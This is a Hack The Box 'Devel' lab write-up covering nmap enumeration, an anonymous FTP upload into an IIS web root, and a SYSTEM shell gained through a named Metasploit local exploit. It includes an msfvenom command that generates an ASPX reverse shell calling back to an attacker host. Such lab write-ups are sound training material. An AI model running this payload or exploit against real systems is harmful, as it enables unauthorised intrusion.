Title: HTB Devel box writeup
Tags: oscp, htb, asp, ftp
Summary: Another straightforward windows box
Date: 2020-09-28 15:00
Status: published

# Enumeration
As usual full nmap sS scan:
```text
    Nmap 7.80 scan initiated Mon Sep 28 10:10:15 2020 as: nmap -sS -p- -oA enum/nmap-ss-all 10.10.10.5
    Nmap scan report for devel.htb (10.10.10.5)
    Host is up (0.055s latency).
    Not shown: 65533 filtered ports
    PORT   STATE SERVICE
    21/tcp open  ftp
    80/tcp open  http
    Nmap done at Mon Sep 28 10:12:24 2020 -- 1 IP address (1 host up) scanned in 128.64 seconds
```
Following by the scripted scan:
```text
    Nmap 7.80 scan initiated Mon Sep 28 10:19:06 2020 as: nmap -sC -A -T4 -p21,80 -oA enum/nmap-sCAT4-open 10.10.10.5
    Nmap scan report for devel.htb (10.10.10.5)
    Host is up (0.053s latency).
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 03-18-17  02:06AM       <DIR>          aspnet_client
    | 03-17-17  05:37PM                  689 iisstart.htm
    |_03-17-17  05:37PM               184946 welcome.png
    | ftp-syst: 
    |_  SYST: Windows_NT
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: IIS7
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose|phone|specialized
    Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
    OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
    Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    TRACEROUTE (using port 21/tcp)
    HOP RTT      ADDRESS
    1   53.90 ms 10.10.14.1
    2   53.99 ms devel.htb (10.10.10.5)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Mon Sep 28 10:19:19 2020 -- 1 IP address (1 host up) scanned in 13.79 seconds
```
And that's all that necessary to get foothold.

# Exploitation
FTP allows anonymous access and to upload arbitrary files in there:

![ftp uploading](/cstatic/htb-devel/upload-shell.png)

Moreover, FTP Root could be accessed from the web server, so to acquire shell is as easy
as upload crafted aspx page and navigate to it. Generated it using
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=53 -f aspx -o sh.asp`:

![unpriv iis web user shell](/cstatic/htb-devel/unpriv-shell.png)

# Privilege escalation
PE was done with MSF and exploit suggester. `windows/local/ms15_051_client_copy_image`
worked flawlessly providing us with SYSTEM shell:

![root shell](/cstatic/htb-devel/root-shell.png)

# Additional
Found some writeups with PE w/o MSF, worth to read:

 - https://0xdf.gitlab.io/2019/03/05/htb-devel.html#privesc-web--system
 - https://esseum.com/hack-the-box-devel-writeup/
 - https://agent-tiro.com/htb/devel
 - https://cyruslab.net/2020/04/30/hacktheboxdevel/
 - https://nullarmor.github.io/posts/devel
